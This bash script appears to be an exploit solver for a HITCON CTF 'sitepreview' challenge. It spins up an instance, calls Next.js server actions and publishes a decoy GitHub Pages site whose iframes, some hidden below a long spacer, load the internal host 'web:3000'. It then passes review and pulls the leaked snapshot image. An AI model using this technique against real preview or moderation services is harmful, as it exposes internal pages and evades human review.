#!/bin/bash
set -o pipefail
BASE_EXT="https://sitepreview.chal.hitconctf.com"
PAGE_URL="https://marlobbz.github.io/sitepreview-test/"
get_port() { curl -s -b cookies.txt --max-time 30 "$BASE_EXT/" | grep -oE 'http://sitepreview\.chal\.hitconctf\.com:[0-9]+' | head -1; }
PORT=$(get_port)
if [ -z "$PORT" ]; then
  curl -s -c cookies.txt -b cookies.txt -X POST "$BASE_EXT/create" -d "token=$TEAM_TOKEN" -o /dev/null
  sleep 5; PORT=$(get_port)
fi
echo "INSTANCE=$PORT"
probe=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$PORT/" || true)
if [ "$probe" != "200" ]; then
  echo "recreating instance (probe=$probe)"
  curl -s -b cookies.txt -X POST "$BASE_EXT/stop" -o /dev/null
  sleep 3
  curl -s -c cookies.txt -b cookies.txt -X POST "$BASE_EXT/create" -d "token=$TEAM_TOKEN" -o /dev/null
  sleep 5; PORT=$(get_port); echo "INSTANCE2=$PORT"
fi
for i in $(seq 1 45); do code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 "$PORT/" || true); [ "$code" = "200" ] && break; sleep 2; done
[ "$code" = "200" ] || { echo "NOT READY"; exit 1; }

# 1. create preview
ENC=$(python3 -c "import json,sys;print(json.dumps([sys.argv[1]]))" "$PAGE_URL")
R=$(curl -s --max-time 60 -X POST "$PORT/" -H "Next-Action: 40826ee1e38d462252e0a1f6761f0741fca9607bbe" -H "Content-Type: text/plain;charset=UTF-8" -d "$ENC")
PID=$(echo "$R" | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1)
[ -z "$PID" ] && { echo "CREATE_FAILED: $R"; exit 1; }
echo "PID=$PID"

# 2. build page with embed, push
python3 - <<PYEOF
import os
pid = "$PID"
ext = f"http://sitepreview.chal.hitconctf.com:30854/render/{pid}"
VARIANT = os.environ.get("VARIANT", "embed")
if VARIANT == "embed":
    html = f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Aurora Design — Creative Studio</title>
<style>body{{font-family:system-ui,sans-serif;margin:0;color:#1a202c}}
header{{background:linear-gradient(135deg,#5a67d8,#9f7aea);color:#fff;padding:60px 20px;text-align:center}}
main{{max-width:960px;margin:40px auto;padding:0 20px}}
.widget{{border:1px solid #e2e8f0;border-radius:12px;overflow:hidden}}
iframe{{border:0}}
footer{{background:#2d3748;color:#a0aec0;text-align:center;padding:24px;margin-top:40px}}</style></head>
<body>
<header><h1>Aurora Design</h1><p>Creative studio for modern brands</p></header>
<main><section><h2>Live preview widget</h2>
<div class="widget"><iframe src="{ext}" title="Snapshot of Aurora Design" width="100%" height="480" loading="lazy"></iframe></div>
<iframe src="http://web:3000/render/{pid}" title="p" width="320" height="240" loading="lazy" style="border:0"></iframe>
</section></main>
<footer>© 2026 Aurora Design Studio</footer></body></html>"""
elif VARIANT == "lazylow":
    html = f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Aurora Design — Creative Studio</title>
<style>body{{font-family:system-ui,sans-serif;margin:0;color:#1a202c}}
header{{background:linear-gradient(135deg,#5a67d8,#9f7aea);color:#fff;padding:60px 20px;text-align:center}}
main{{max-width:960px;margin:40px auto;padding:0 20px}}
.widget{{border:1px solid #e2e8f0;border-radius:12px;overflow:hidden}}
iframe{{border:0}}
footer{{background:#2d3748;color:#a0aec0;text-align:center;padding:24px;margin-top:40px}}</style></head>
<body>
<header><h1>Aurora Design</h1><p>Creative studio for modern brands</p></header>
<main><p>We craft brands, websites and products for ambitious teams.</p>
<p>Our portfolio spans fintech, retail and healthcare.</p>
<div style="height:3000px"></div>
<section><h2>Live preview widget</h2>
<div class="widget"><iframe src="{ext}" title="Snapshot of Aurora Design" width="100%" height="480" loading="lazy"></iframe></div>
<iframe src="http://web:3000/render/{pid}" title="p" width="320" height="240" loading="lazy" style="border:0"></iframe>
</section></main>
<footer>© 2026 Aurora Design Studio</footer></body></html>"""
elif VARIANT == "fakefast":
    html = f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Aurora Design — Creative Studio</title>
<style>body{{font-family:system-ui,sans-serif;margin:0;color:#1a202c}}
header{{background:linear-gradient(135deg,#5a67d8,#9f7aea);color:#fff;padding:60px 20px;text-align:center}}
main{{max-width:960px;margin:40px auto;padding:0 20px}}
.widget{{border:1px solid #e2e8f0;border-radius:12px;overflow:hidden}}
iframe{{border:0}}
footer{{background:#2d3748;color:#a0aec0;text-align:center;padding:24px;margin-top:40px}}</style></head>
<body>
<header><h1>Aurora Design</h1><p>Creative studio for modern brands</p></header>
<main><section><h2>Live preview widget</h2>
<div class="widget"><iframe src="https://marlobbz.github.io/sitepreview-test/render/{pid}/" title="Website snapshot" width="100%" height="480"></iframe></div>
</section></main>
<footer>© 2026 Aurora Design Studio</footer></body></html>"""
elif VARIANT == "plain":
    html = """<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Aurora Design — Creative Studio</title></head>
<body><header style="background:linear-gradient(135deg,#5a67d8,#9f7aea);color:#fff;padding:60px 20px;text-align:center"><h1>Aurora Design</h1><p>Creative studio for modern brands</p></header>
<main style="max-width:960px;margin:40px auto"><p>We craft brands, websites and products.</p></main>
<footer style="background:#2d3748;color:#a0aec0;text-align:center;padding:24px">© 2026 Aurora Design Studio</footer></body></html>"""
open("index.html","w").write(html)
print("page built:", VARIANT)
PYEOF
git config user.email "bot@users.noreply.github.com"
git config user.name "Actions bot"
git add index.html
git commit -qm "page for $PID"
git push -q origin main || { echo "PUSH_FAILED"; exit 1; }
echo "PUSHED, waiting for Pages build..."
for i in $(seq 1 30); do
  C=$(curl -s --max-time 15 "$PAGE_URL" | grep -c "$PID" || true)
  [ "$C" -ge 1 ] && { echo "PAGE_LIVE after ${i}0s"; break; }
  sleep 10
done

# 3. request review
PAGE=$(curl -s --max-time 30 "$PORT/preview/$PID")
BLOB=$(echo "$PAGE" | python3 -c "
import sys,re
h=sys.stdin.read()
m=re.search(r'1c:.\\\\\"([A-Za-z0-9+/=]{50,})\\\\\"', h) or re.search(r'1c:\"([A-Za-z0-9+/=]{50,})\"', h) or re.search(r'1c:.\"([A-Za-z0-9+/=]{50,})', h)
print(m.group(1) if m else 'NOBLOB')")
echo "BLOBLEN=${#BLOB}"
[ "$BLOB" = "NOBLOB" ] && exit 1
RR=$(curl -s --max-time 90 -X POST "$PORT/preview/$PID" -H "Next-Action: 400cce7790f1e3554d5a9d0db54d9870b9ca678be9" -H "Content-Type: text/plain;charset=UTF-8" -d "[$BLOB]")
if echo "$RR" | grep -q '"E{'; then echo "REVIEW_ERROR: $RR"; else echo "REVIEW_OK"; fi

# 4. poll decision
T0=$(date +%s)
S=""
while true; do
  S=$(curl -s --max-time 15 "$PORT/render/$PID" | grep -oE '(Approved|Rejected)' | head -1 || true)
  NOW=$(date +%s)
  if [ -n "$S" ]; then echo "DECISION=$S AT=+$((NOW-T0))s"; break; fi
  [ $((NOW-T0)) -gt 180 ] && { echo "DECISION=timeout"; break; }
  sleep 2
done

# 5. extract snapshot if approved
if [ "$S" = "Approved" ]; then
  curl -s --max-time 30 "$PORT/render/$PID" -o render_page.html
  python3 - <<PYEOF
import re, base64
h = open("render_page.html").read()
m = re.search(r'dataUrl\\\\\":\\\\\"(data:image/[^\\\\]+)', h) or re.search(r'dataUrl":"(data:image/[^"]+)', h)
if m:
    du = m.group(1)
    open("snapshot_dataurl.txt","w").write(du)
    b64 = du.split(",",1)[1]
    open("snapshot.png","wb").write(base64.b64decode(b64))
    print("SNAPSHOT_SAVED", len(b64))
else:
    print("NO_DATAURL")
PYEOF
fi
echo "PID=$PID"
